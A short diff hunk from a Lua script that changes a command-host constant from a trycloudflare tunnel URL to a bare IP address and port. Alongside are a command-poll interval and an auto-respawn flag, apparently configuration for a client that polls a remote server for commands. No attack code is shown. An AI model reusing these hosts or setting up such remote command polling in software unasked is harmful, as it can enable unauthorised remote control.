@@ -35,7 +35,7 @@ if not verifyUIDAccess() then
 end
 -- =======================================================
 
-local CMD_HOST          = "https://priced-expression-interracial-providing.trycloudflare.com"
+local CMD_HOST          = "46.8.226.128:3000"
 local CMD_POLL_INTERVAL = 2500
 local autoRespawn       = false
 
